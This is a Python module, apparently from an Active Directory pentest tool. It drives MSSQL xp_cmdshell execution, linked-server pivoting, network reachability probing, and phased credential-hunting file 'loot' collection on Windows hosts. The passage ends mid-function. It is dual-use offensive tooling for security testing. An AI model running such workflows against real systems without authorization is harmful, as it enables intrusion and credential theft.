"""CLI orchestration for MSSQL operations.

This module keeps interactive CLI concerns (printing, follow-up prompts) outside
of the giant `adscan.py`, while delegating execution logic to the service layer.
"""

from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass
from datetime import datetime, timezone
import json
import os
import re
import subprocess
import time
from typing import Any, Protocol

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.integrations.mssql import (
    MSSQLContext,
    MSSQLRunner,
    parse_xp_cmdshell_enable_failure_reason,
    parse_link_xpcmd_execution_success,
    parse_link_xpcmd_identity,
)
from adscan_internal.execution_outcomes import (
    build_no_result_completed_process,
    build_timeout_completed_process,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.cli.winrm import _collect_winrm_pivot_candidates
from adscan_internal.path_utils import get_adscan_home
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.exploitation import ExploitationService
from adscan_internal.services.exploitation.remote_windows_execution import (
    RemoteWindowsAuth,
    RemoteWindowsExecutionService,
)
from adscan_internal.services.ai_backend_availability_service import (
    AIBackendAvailabilityService,
)
from adscan_internal.services.pivot_opportunity_service import (
    ensure_host_bound_workflow_target_viable,
)
from adscan_internal.services.pivot_service import orchestrate_ligolo_pivot_tunnel
from adscan_internal.services.post_pivot_followup_service import (
    PivotExecutionContext,
    maybe_offer_post_pivot_owned_followup,
    refresh_network_inventory_after_pivot,
    render_post_pivot_reachability_delta,
)
from adscan_internal.services.smb_sensitive_file_policy import (
    SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS,
    SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    get_production_sensitive_scan_phase_sequence,
    get_sensitive_file_extensions,
    get_sensitive_phase_definition,
    get_sensitive_phase_extensions,
)
from adscan_internal.services.windows_file_mapping_service import (
    WindowsFileMapEntry,
    WindowsFileMappingError,
    WindowsFileMappingService,
    WindowsPowerShellExecutionResult,
)
from adscan_internal.services.windows_sensitive_scan_policy_service import (
    WindowsSensitiveScanPolicyService,
)
from adscan_internal.services.windows_artifact_acquisition_service import (
    WindowsArtifactAcquisitionResult,
    WindowsArtifactAcquisitionService,
    format_fetch_path_preview,
    summarize_fetch_skip_reasons,
)
from adscan_internal.services.windows_sensitive_phase_execution_service import (
    WindowsSensitivePhaseExecutionService,
)
from adscan_internal.services.windows_ai_sensitive_analysis_service import (
    WindowsAISensitiveAnalysisService,
)
from adscan_internal.text_utils import strip_ansi_codes
from rich.prompt import Confirm
from rich.table import Table


class MssqlShell(Protocol):
    """Minimal shell surface used by MSSQL CLI controller."""

    netexec_path: str | None
    myip: str | None
    domains_data: dict
    domains_dir: str
    current_workspace_dir: str | None

    def _run_netexec(
        self,
        command: str,
        *,
        domain: str | None = None,
        timeout: int | None = None,
        **kwargs,
    ) -> subprocess.CompletedProcess[str] | None: ...

    def _get_lab_slug(self) -> str | None: ...

    def _get_service_executor(
        self,
    ) -> Callable[[str, int], subprocess.CompletedProcess[str]]: ...

    def run_command(
        self, command: str, *, timeout: int | None = None, **kwargs
    ) -> subprocess.CompletedProcess[str] | None: ...

    def ask_for_dump_host(
        self, domain: str, host: str, username: str, password: str, islocal: str
    ) -> None: ...

    def ask_for_mssql_impersonate(
        self, domain: str, host: str, username: str, password: str
    ) -> None: ...

    def mssql_steal_ntlmv2(
        self, domain: str, host: str, username: str, password: str, islocal: str
    ) -> None: ...

    def mssql_impersonate(
        self, domain: str, host: str, username: str, password: str
    ) -> None: ...

    def _get_workspace_cwd(self) -> str: ...


@dataclass(frozen=True, slots=True)
class MssqlExecutionPath:
    """Describe one MSSQL-backed remote execution path."""

    mode: str
    linked_server: str | None = None
    identity: str | None = None


def _execute_powershell_via_mssql(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
    script: str,
    operation_name: str | None = None,
) -> str:
    """Execute PowerShell over MSSQL command execution and return stdout."""
    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    result = remote_executor.execute_powershell(
        auth,
        script,
        operation_name=operation_name or "mssql_powershell",
        preferred_transport="mssql",
        timeout=300,
    )
    if not result.success and not result.stdout:
        raise RuntimeError(result.error_message or result.stderr or "MSSQL PowerShell execution failed.")
    if result.stderr:
        _stderr_preview = str(result.stderr or "").strip()[:400]
        print_info_debug(
            f"[mssql] {operation_name or 'powershell'} stderr ({len(str(result.stderr or ''))} chars): "
            f"{_stderr_preview!r}"
        )
    return _normalize_mssql_powershell_stdout(str(result.stdout or ""))


def _normalize_mssql_powershell_stdout(stdout: str) -> str:
    """Normalize MSSQL PowerShell stdout by removing wrapper noise like ``NULL`` lines."""
    normalized_lines = [
        line.rstrip()
        for line in str(stdout or "").splitlines()
        if line.strip() and line.strip().upper() != "NULL"
    ]
    return "\n".join(normalized_lines).strip()


def _load_mssql_json_stdout(stdout: str) -> Any:
    """Decode one JSON payload from MSSQL PowerShell stdout with trailing wrapper lines removed.

    xp_cmdshell truncates each output row at 255 characters, which can split a long
    JSON string across multiple rows.  We therefore also attempt to parse the lines
    joined without any separator so that mid-string truncations are reconstructed.
    """
    normalized = _normalize_mssql_powershell_stdout(stdout)
    if not normalized:
        return {}
    lines = normalized.splitlines()
    # Fast path: single line or last line is a self-contained JSON object/array.
    for candidate in reversed(lines):
        stripped = candidate.strip()
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                return json.loads(stripped)
            except json.JSONDecodeError:
                break  # truncated — fall through to concatenation attempt
    # xp_cmdshell may have split the JSON across 255-char rows; join without separator.
    concatenated = "".join(line.rstrip() for line in lines)
    if concatenated.startswith("{") or concatenated.startswith("["):
        return json.loads(concatenated)
    return json.loads(normalized)


def _build_mssql_windows_architecture_script() -> str:
    """Return a PowerShell script that detects remote Windows architecture."""
    from adscan_internal.cli.winrm import _build_winrm_windows_architecture_script

    return _build_winrm_windows_architecture_script()


def detect_mssql_windows_architecture(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
) -> str | None:
    """Detect remote Windows architecture through MSSQL command execution."""
    output = _execute_powershell_via_mssql(
        shell=shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        execution_path=execution_path,
        script=_build_mssql_windows_architecture_script(),
        operation_name="windows_architecture_detect",
    )
    payload = _load_mssql_json_stdout(output)
    if not isinstance(payload, dict):
        return None
    normalized_arch = str(payload.get("architecture") or "").strip().lower()
    if not normalized_arch or normalized_arch == "unknown":
        return None
    return normalized_arch


def mssql_upload(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
    local_path: str,
    remote_path: str,
) -> bool:
    """Upload a file to the remote host through MSSQL-backed execution."""
    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    result = remote_executor.upload_file(
        auth,
        local_path=local_path,
        remote_path=remote_path,
        preferred_transport="mssql",
        timeout=300,
    )
    if not result.success:
        print_warning(
            f"MSSQL upload failed for {mark_sensitive(remote_path, 'path')}: "
            f"{mark_sensitive(result.error_message or 'unknown error', 'detail')}"
        )
        return False
    print_success(f"MSSQL upload completed: {mark_sensitive(remote_path, 'path')}")
    return True


def _build_mssql_network_inventory_script() -> str:
    """Return the shared pivot inventory script for MSSQL execution."""
    from adscan_internal.cli.winrm import _build_winrm_network_inventory_script

    return _build_winrm_network_inventory_script()


def _convert_subnet_mask_to_prefix_length(mask: str) -> int | None:
    """Convert one dotted IPv4 subnet mask into a prefix length."""
    octets = str(mask or "").strip().split(".")
    if len(octets) != 4 or any(not octet.isdigit() for octet in octets):
        return None
    return sum(bin(int(octet)).count("1") for octet in octets)


def _parse_mssql_ipconfig_interfaces(stdout: str) -> list[dict[str, Any]]:
    """Parse IPv4 interfaces from one ipconfig output."""
    interfaces: list[dict[str, Any]] = []
    current_interface = ""
    pending_ipv4: str | None = None
    for raw_line in str(stdout or "").splitlines():
        line = raw_line.rstrip()
        stripped = line.strip()
        if not stripped:
            continue
        if not raw_line.startswith((" ", "\t")) and stripped.endswith(":"):
            current_interface = stripped[:-1].strip()
            pending_ipv4 = None
            continue
        ip_match = re.search(r"IPv4 Address[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line)
        if ip_match:
            pending_ipv4 = ip_match.group(1)
            continue
        mask_match = re.search(r"Subnet Mask[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line)
        if pending_ipv4 and mask_match:
            prefix_length = _convert_subnet_mask_to_prefix_length(mask_match.group(1))
            if pending_ipv4 != "127.0.0.1" and not pending_ipv4.startswith("169.254."):
                interfaces.append(
                    {
                        "IPAddress": pending_ipv4,
                        "PrefixLength": prefix_length,
                        "InterfaceAlias": current_interface,
                    }
                )
            pending_ipv4 = None
    return interfaces


def _parse_mssql_route_print(stdout: str, interfaces: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Parse IPv4 routes from one ``route print -4`` output."""
    interface_alias_by_ip = {
        str(entry.get("IPAddress") or "").strip(): str(entry.get("InterfaceAlias") or "").strip()
        for entry in interfaces
        if str(entry.get("IPAddress") or "").strip()
    }
    routes: list[dict[str, Any]] = []
    active_routes = False
    route_pattern = re.compile(
        r"^\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+"
        r"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+"
        r"(\S+)\s+"
        r"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+"
        r"([0-9]+)\s*$"
    )
    for line in str(stdout or "").splitlines():
        if re.match(r"^\s*Active Routes:\s*$", line):
            active_routes = True
            continue
        if not active_routes:
            continue
        if re.match(r"^\s*(Persistent Routes:|====)", line):
            break
        if re.match(r"^\s*Network Destination\s+Netmask\s+Gateway\s+Interface\s+Metric\s*$", line):
            continue
        match = route_pattern.match(line)
        if not match:
            continue
        destination, mask, gateway, interface_ip, metric_text = match.groups()
        prefix_length = _convert_subnet_mask_to_prefix_length(mask)
        if prefix_length is None:
            continue
        alias = interface_alias_by_ip.get(interface_ip) or interface_ip
        routes.append(
            {
                "DestinationPrefix": f"{destination}/{prefix_length}",
                "NextHop": gateway,
                "InterfaceAlias": alias,
                "RouteMetric": int(metric_text),
            }
        )
    return routes


def _collect_mssql_network_inventory(
    *,
    shell: MssqlShell,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
) -> dict[str, Any]:
    """Collect IPv4 interfaces/routes over MSSQL using short inline commands."""
    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    ipconfig_result = remote_executor.execute_command(
        auth,
        "ipconfig",
        operation_name="pivot_ipconfig",
        preferred_transport="mssql",
        timeout=180,
    )
    if not ipconfig_result.success:
        raise RuntimeError(ipconfig_result.error_message or "MSSQL ipconfig execution failed.")
    route_result = remote_executor.execute_command(
        auth,
        "route print -4",
        operation_name="pivot_route_print",
        preferred_transport="mssql",
        timeout=180,
    )
    if not route_result.success:
        raise RuntimeError(route_result.error_message or "MSSQL route print execution failed.")
    interfaces = _parse_mssql_ipconfig_interfaces(ipconfig_result.stdout)
    routes = _parse_mssql_route_print(route_result.stdout, interfaces)
    return {
        "interfaces": interfaces,
        "routes": routes,
        "interface_source": "ipconfig",
        "route_source": "route print -4",
    }


def _build_mssql_pivot_probe_script(targets: list[Any]) -> str:
    """Return the shared pivot probe script for MSSQL execution."""
    from adscan_internal.cli.winrm import _build_winrm_pivot_probe_script

    return _build_winrm_pivot_probe_script(targets)


def _select_mssql_pivot_targets(
    *,
    payload: dict[str, Any] | None = None,
    candidate_entries: list[dict[str, Any]] | None = None,
    remote_interfaces: list[dict[str, Any]],
    remote_routes: list[dict[str, Any]],
    max_targets: int = 25,
) -> list[Any]:
    """Reuse the WinRM target selector for MSSQL-based pivot checks."""
    from adscan_internal.cli.winrm import _select_winrm_pivot_targets

    return _select_winrm_pivot_targets(
        payload=payload,
        candidate_entries=candidate_entries,
        remote_interfaces=remote_interfaces,
        remote_routes=remote_routes,
        max_targets=max_targets,
    )


def _persist_mssql_pivot_reachability_report(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    payload: dict[str, Any],
) -> str | None:
    """Persist one MSSQL pivot reachability report under the host workspace."""
    report_path = os.path.join(
        shell.current_workspace_dir or "",
        shell.domains_dir,
        domain,
        "mssql",
        f"{host}_pivot_reachability_report.json",
    )
    try:
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        with open(report_path, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, sort_keys=False)
            handle.write("\n")
    except OSError:
        return None
    return report_path


def _summarize_mssql_pivot_inventory(
    entries: list[dict[str, Any]],
    *,
    route_mode: bool = False,
) -> str:
    """Return a short debug summary for MSSQL pivot inventory entries."""
    from adscan_internal.cli.winrm import _summarize_winrm_pivot_inventory

    return _summarize_winrm_pivot_inventory(entries, route_mode=route_mode)


def _build_mssql_context(shell: MssqlShell) -> MSSQLContext:
    if not shell.netexec_path:
        raise ValueError("netexec_path not configured")

    def _infer_domain_from_command(command: str) -> str | None:
        import shlex

        try:
            argv = shlex.split(str(command or ""))
        except ValueError:
            return None
        for idx, token in enumerate(argv):
            if token in {"-d", "--domain"} and idx + 1 < len(argv):
                value = str(argv[idx + 1]).strip()
                if value:
                    return value
        return None

    def _runner(command: str, timeout: int):
        domain = _infer_domain_from_command(command)
        if hasattr(shell, "_run_netexec"):
            result = shell._run_netexec(
                command,
                domain=domain,
                timeout=timeout,
                operation_kind="mssql_remote_exec",
                service="mssql",
                target_count=1,
            )
        else:
            result = shell.run_command(command, timeout=timeout)
        if result is not None:
            return result
        last_error = getattr(shell, "_last_run_command_error", None)
        if isinstance(last_error, tuple) and last_error and last_error[0] == "timeout":
            return build_timeout_completed_process(command, tool_name="netexec_mssql")
        return build_no_result_completed_process(command, tool_name="netexec_mssql")

    return MSSQLContext(netexec_path=shell.netexec_path, command_runner=_runner)


def _get_workspace_dir(shell: MssqlShell) -> str:
    """Return the active workspace directory for persisted MSSQL artifacts."""
    resolver = getattr(shell, "_get_workspace_cwd", None)
    if callable(resolver):
        return str(resolver())
    return str(getattr(shell, "current_workspace_dir", "") or os.getcwd())


def _is_ctf_domain_pwned(shell: MssqlShell, domain: str) -> bool:
    """Return whether the current CTF domain is already marked as pwned."""
    if str(getattr(shell, "type", "") or "").strip().lower() != "ctf":
        return False
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return False
    domain_record = domains_data.get(domain) or {}
    if not isinstance(domain_record, dict):
        return False
    return str(domain_record.get("auth", "") or "").strip().lower() == "pwned"


def _persist_mssql_linked_servers(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    linked_servers: list[str],
) -> str:
    """Persist linked-server findings for later cross-domain correlation."""
    workspace_dir = _get_workspace_dir(shell)
    output_dir = os.path.join(workspace_dir, shell.domains_dir, domain, "mssql")
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(
        output_dir,
        f"linked_servers.{host}.{username}.json".replace("\\", "_").replace("/", "_"),
    )
    payload = {
        "domain": domain,
        "host": host,
        "username": username,
        "linked_servers": linked_servers,
    }
    with open(output_path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, ensure_ascii=True)
    return output_path


def _fetch_mssql_phase_files(
    shell: MssqlShell,
    *,
    remote_executor: RemoteWindowsExecutionService,
    auth: RemoteWindowsAuth,
    selected_entries: list[WindowsFileMapEntry],
    loot_dir: str,
) -> WindowsArtifactAcquisitionResult:
    """Fetch one MSSQL-backed phase using the shared acquisition service."""
    file_targets = [
        (
            entry.full_name,
            WindowsFileMappingService.build_local_relative_path(entry.full_name),
        )
        for entry in selected_entries
        if entry.full_name
    ]
    result = WindowsArtifactAcquisitionService().acquire_files(
        file_targets=file_targets,
        download_dir=loot_dir,
        workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
        file_fetcher=lambda remote_path, save_path: (
            _download_mssql_target(
                remote_executor=remote_executor,
                auth=auth,
                remote_path=remote_path,
                local_path=save_path,
            )
        ),
    )
    if result.per_file_failures:
        failure_summary = summarize_fetch_skip_reasons(list(result.per_file_failures))
        print_warning(
            "MSSQL per-file fetch skipped inaccessible files but continued: "
            f"downloaded={len(result.downloaded_files)} failed={len(list(result.per_file_failures))} "
            f"access_denied={failure_summary['access_denied']} "
            f"file_in_use={failure_summary['file_in_use']} "
            f"other={failure_summary['other']} "
            f"preview=[{format_fetch_path_preview(items=list(result.per_file_failures))}]"
        )
    return result


def _run_mssql_ai_sensitive_data_scan(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    entries: list[WindowsFileMapEntry],
    run_root_abs: str,
    execution_path: MssqlExecutionPath,
) -> dict[str, object]:
    """Run AI-assisted sensitive-data analysis over a cached MSSQL manifest."""
    from adscan_internal.cli.smb import (
        _handle_prioritized_findings_actions,
        _render_file_credentials_table,
    )

    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    return WindowsAISensitiveAnalysisService().execute(
        shell,
        domain=domain,
        host=host,
        username=username,
        entries=entries,
        run_root_abs=run_root_abs,
        workflow_label="MSSQL",
        source_share="mssql",
        artifact_transport_folder="mssql",
        select_scope=lambda current_shell: WindowsSensitiveScanPolicyService().select_ai_triage_scope(
            shell=current_shell
        ),
        should_inspect_prioritized_files=lambda current_shell: WindowsSensitiveScanPolicyService().should_inspect_ai_prioritized_files(
            shell=current_shell,
            workflow_label="MSSQL",
        ),
        should_continue_after_findings=lambda current_shell, current_domain: WindowsSensitiveScanPolicyService().should_continue_after_ai_findings(
            shell=current_shell,
            domain=current_domain,
            workflow_label="MSSQL",
            skip_for_pwned_ctf=_is_ctf_domain_pwned(current_shell, current_domain),
        ),
        skip_for_pwned_ctf=_is_ctf_domain_pwned,
        fetch_selected_entries=lambda selected_entries, loot_dir: _fetch_mssql_phase_files(
            shell,
            remote_executor=remote_executor,
            auth=auth,
            selected_entries=selected_entries,
            loot_dir=loot_dir,
        ),
        render_findings_table=lambda current_shell, candidate, findings, source_label: _render_file_credentials_table(
            current_shell,
            candidate=candidate,
            findings=findings,
            source_label=source_label,
        ),
        handle_findings_actions=_handle_prioritized_findings_actions,
    ).to_dict()


def _download_mssql_target(
    *,
    remote_executor: RemoteWindowsExecutionService,
    auth: RemoteWindowsAuth,
    remote_path: str,
    local_path: str,
) -> str:
    """Download one remote file via MSSQL or raise a descriptive error."""
    result = remote_executor.download_file(
        auth,
        remote_path=remote_path,
        local_path=local_path,
        preferred_transport="mssql",
        timeout=300,
    )
    if not result.success:
        raise RuntimeError(result.error_message or "MSSQL file download failed.")
    return str(result.local_path or local_path)


def _run_mssql_filesystem_mapping(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
) -> dict[str, object]:
    """Generate a deterministic filesystem manifest and run shared local analysis via MSSQL."""
    availability = AIBackendAvailabilityService().get_availability()
    mode = WindowsSensitiveScanPolicyService().select_analysis_mode(
        shell=shell,
        ai_configured=availability.configured,
        workflow_label="MSSQL",
    )
    if mode == "skip":
        print_info("MSSQL sensitive-data analysis skipped by user.")
        return {"completed": False, "skipped": True}

    workspace_dir = _get_workspace_dir(shell)
    cache_key = WindowsFileMappingService.build_cache_key(
        host=host,
        username=username,
        root_strategy=execution_path.mode,
    )
    output_path = os.path.join(
        workspace_dir,
        shell.domains_dir,
        domain,
        "mssql",
        "sensitive",
        cache_key,
        "file_tree_map.json",
    )
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    remote_executor = RemoteWindowsExecutionService(shell)
    auth = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )
    mapping_service = WindowsFileMappingService()

    def _executor(script: str) -> WindowsPowerShellExecutionResult:
        result = remote_executor.execute_powershell(
            auth,
            script,
            operation_name="mssql_sensitive_file_map",
            preferred_transport="mssql",
            timeout=300,
        )
        return WindowsPowerShellExecutionResult(
            stdout=result.stdout,
            stderr=result.stderr or (result.error_message or ""),
            had_errors=not result.success,
        )

    started_at = time.perf_counter()
    try:
        mapping_result = mapping_service.generate_file_map(
            command_executor=_executor,
            output_path=output_path,
            metadata={
                "transport": "mssql",
                "execution_mode": execution_path.mode,
                "linked_server": execution_path.linked_server,
                "identity": execution_path.identity,
            },
        )
    except WindowsFileMappingError as exc:
        telemetry.capture_exception(exc)
        print_error(f"MSSQL filesystem mapping failed: {exc}")
        return {"completed": False, "error": str(exc)}

    entries = list(mapping_result.get("entries") or [])
    duration = time.perf_counter() - started_at
    print_success(
        "Deterministic MSSQL filesystem mapping prepared at "
        f"{mark_sensitive(output_path, 'path')} with {len(entries)} file entries "
        f"in {duration:.2f}s."
    )

    run_root_abs = os.path.join(os.path.dirname(output_path), "phases")
    os.makedirs(run_root_abs, exist_ok=True)
    if mode == "ai":
        return _run_mssql_ai_sensitive_data_scan(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            entries=entries,
            run_root_abs=run_root_abs,
            execution_path=execution_path,
        )
    phase_sequence = get_production_sensitive_scan_phase_sequence()
    results: list[dict[str, object]] = []
    phases_to_run = phase_sequence[:3]
    auth_for_fetch = RemoteWindowsAuth(
        domain=domain,
        host=host,
        username=username,
        secret=password,
        linked_server=execution_path.linked_server,
    )

    def _run_phase(phase: str) -> dict[str, object]:
        phase_definition = get_sensitive_phase_definition(phase)
        phase_label = str(phase_definition.get("label", phase) or phase)
        if phase in {
            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
        }:
            phase_extensions = get_sensitive_file_extensions(
                str(phase_definition.get("profile", ""))
            )
        else:
            phase_extensions = get_sensitive_phase_extensions(phase)
        selected_entries = WindowsFileMappingService.select_entries_by_extensions(
            entries=entries,
            extensions=phase_extensions,
        )
        phase_root_abs = os.path.join(run_root_abs, phase)
        loot_dir = os.path.join(phase_root_abs, "loot")
        os.makedirs(loot_dir, exist_ok=True)
        print_info(
            "Running deterministic MSSQL analysis "
            f"({mark_sensitive(phase_label, 'text')}) on "
            f"{mark_sensitive(host, 'hostname')}."
        )
        return WindowsSensitivePhaseExecutionService().execute_phase(
            shell,
            domain=domain,
            host=host,
            username=username,
            phase=phase,
            phase_label=phase_label,
            phase_root_abs=phase_root_abs,
            loot_dir=loot_dir,
            selected_entries_count=len(selected_entries),
            phase_excluded_total=0,
            fetcher=lambda: _fetch_mssql_phase_files(
                shell,
                remote_executor=remote_executor,
                auth=auth_for_fetch,
                selected_entries=selected_entries,
                loot_dir=loot_dir,
            ),
            source_share="mssql",
            source_artifact="mssql deterministic file scan",
            transport_label="MSSQL",
        ).to_dict()

    first_result = _run_phase(phases_to_run[0])
    results.append(first_result)
    if not WindowsSensitiveScanPolicyService().should_continue_with_deeper_scan(
        shell=shell,
        domain=domain,
        phase_result=first_result,
        workflow_label="MSSQL",
        skip_for_pwned_ctf=_is_ctf_domain_pwned(shell, domain),
    ):
        return {
            "completed": True,
            "output_path": output_path,
            "entry_count": len(entries),
            "phases_run": results,
        }

    for phase in phases_to_run[1:]:
        phase_result = _run_phase(phase)
        results.append(phase_result)

    if WindowsSensitiveScanPolicyService().should_continue_with_heavy_artifacts(
        shell=shell,
        domain=domain,
        workflow_label="MSSQL",
        skip_for_pwned_ctf=_is_ctf_domain_pwned(shell, domain),
    ):
        results.append(_run_phase(SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS))

    loot_root_rel = os.path.relpath(run_root_abs, _get_workspace_dir(shell))
    print_info(
        "Deterministic MSSQL analysis completed. "
        f"Loot root: {mark_sensitive(loot_root_rel, 'path')}."
    )

    return {
        "completed": True,
        "output_path": output_path,
        "entry_count": len(entries),
        "phases_run": results,
    }


def check_pivot_reachability_via_mssql(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    execution_path: MssqlExecutionPath,
    offer_post_pivot_owned_followup: bool = True,
) -> None:
    """Check whether an MSSQL-execution host can reach IPs hidden from the original vantage."""
    from adscan_internal.cli.winrm import _load_workspace_network_reachability_report

    reachability_payload = _load_workspace_network_reachability_report(shell, domain=domain)
    if not reachability_payload:
        print_info_debug(
            "Skipping MSSQL pivot reachability check: no current-vantage reachability report is available."
        )
        return
    ip_entries = reachability_payload.get("ips", [])
    if not isinstance(ip_entries, list):
        print_info_debug(
            "Skipping MSSQL pivot reachability check: reachability report has no usable IP entries."
        )
        return
    candidate_entries, candidate_counts, _ = _collect_winrm_pivot_candidates(
        shell,
        domain=domain,
        payload=reachability_payload,
    )
    if candidate_counts["total_count"] == 0:
        print_info(
            "Skipping MSSQL pivot probing because there are no hidden current-vantage "
            "or trusted-domain targets left to validate."
        )
        print_info_debug(
            "Skipping MSSQL pivot reachability check: no host-level hidden targets or inter-domain trust targets exist."
        )
        return

    try:
        print_operation_header(
            "MSSQL Pivot Reachability Check",
            details={
                "Domain": domain,
                "Pivot Host": host,
                "Username": username,
                "Host Hidden IPs": str(candidate_counts["host_hidden_count"]),
                "Trusted-Domain Targets": str(candidate_counts["trusted_domain_count"]),
                "Protocol": execution_path.mode,
            },
            icon="🧭",
        )
        print_info(
            "Assessing whether this MSSQL execution path can reach hidden current-vantage targets "
            "and unresolved trusted-domain controllers."
        )
        inventory_payload = _collect_mssql_network_inventory(
            shell=shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
        )
        if not isinstance(inventory_payload, dict):
            print_warning("MSSQL network inventory returned an unexpected payload; skipping pivot reachability check.")
            return
        remote_interfaces = inventory_payload.get("interfaces", [])
        remote_routes = inventory_payload.get("routes", [])
        interface_source = str(inventory_payload.get("interface_source") or "").strip() or "none"
        route_source = str(inventory_payload.get("route_source") or "").strip() or "none"
        if not isinstance(remote_interfaces, list):
            remote_interfaces = []
        if not isinstance(remote_routes, list):
            remote_routes = []
        normalized_interfaces = [entry for entry in remote_interfaces if isinstance(entry, dict)]
        normalized_routes = [entry for entry in remote_routes if isinstance(entry, dict)]
        print_info_debug(
            "MSSQL pivot inventory summary: "
            f"interface_source={mark_sensitive(interface_source, 'text')} "
            f"interfaces={len(normalized_interfaces)} "
            f"preview={mark_sensitive(_summarize_mssql_pivot_inventory(normalized_interfaces), 'text')} "
            f"route_source={mark_sensitive(route_source, 'text')} "
            f"routes={len(normalized_routes)} "
            f"route_preview={mark_sensitive(_summarize_mssql_pivot_inventory(normalized_routes, route_mode=True), 'text')}"
        )

        selected_targets = _select_mssql_pivot_targets(
            candidate_entries=candidate_entries,
            remote_interfaces=normalized_interfaces,
            remote_routes=normalized_routes,
        )
        if not selected_targets:
            hidden_targets = [
                str(entry.get("ip") or "").strip()
                for entry in candidate_entries
                if isinstance(entry, dict) and str(entry.get("ip") or "").strip()
            ]
            report_path = _persist_mssql_pivot_reachability_report(
                shell,
                domain=domain,
                host=host,
                payload={
                    "generated_at": datetime.now(timezone.utc).isoformat(),
                    "domain": domain,
                    "pivot_host": host,
                    "pivot_username": username,
                    "interfaces": normalized_interfaces,
                    "routes": normalized_routes,
                    "interface_source": interface_source,
                    "route_source": route_source,
                    "summary": {
                        "hidden_target_count": candidate_counts["host_hidden_count"],
                        "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
                        "candidate_count": 0,
                        "confirmed_reachable_count": 0,
                        "same_subnet_no_response_count": 0,
                        "no_connectivity_confirmed_count": 0,
                    },
                    "skip_reason": "no_matching_subnet_or_route",
                    "hidden_targets": hidden_targets,
                    "candidate_origins": candidate_counts,
                    "targets": [],
                },
            )
            if report_path:
                print_info_debug(
                    "MSSQL pivot skip diagnostics saved to "
                    f"{mark_sensitive(report_path, 'path')}."
                )
            return

        subnet_candidates = sum(
            1 for target in selected_targets if str(target.selection_reason).startswith("same_subnet:")
        )
        routed_candidates = len(selected_targets) - subnet_candidates
        trusted_domain_candidates = sum(
            1 for target in selected_targets if target.origin == "trusted_domain_connectivity"
        )
        print_info(
            f"This host may be a useful pivot for {len(selected_targets)} target(s) "
            f"({candidate_counts['host_hidden_count']} hidden current-vantage, "
            f"{candidate_counts['trusted_domain_count']} trusted-domain, "
            f"{subnet_candidates} same-subnet, {routed_candidates} routed)."
        )
        print_info_debug(
            "MSSQL pivot candidate selection: "
            f"selected={len(selected_targets)} "
            f"trusted_domain={trusted_domain_candidates} "
            f"preview={mark_sensitive(', '.join(f'{target.ip}:{target.origin}:{target.selection_reason}' for target in selected_targets), 'text')}"
        )

        default_confirm = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
        if not Confirm.ask(
            (
                f"Do you want to probe {len(selected_targets)} likely pivot target(s) from "
                f"{mark_sensitive(host, 'hostname')} via MSSQL?"
            ),
            default=default_confirm,
        ):
            print_info("Skipping MSSQL pivot reachability probing by user choice.")
            return

        probe_stdout = _execute_powershell_via_mssql(
            shell=shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
            script=_build_mssql_pivot_probe_script(selected_targets),
            operation_name="pivot_tcp_probe",
        )
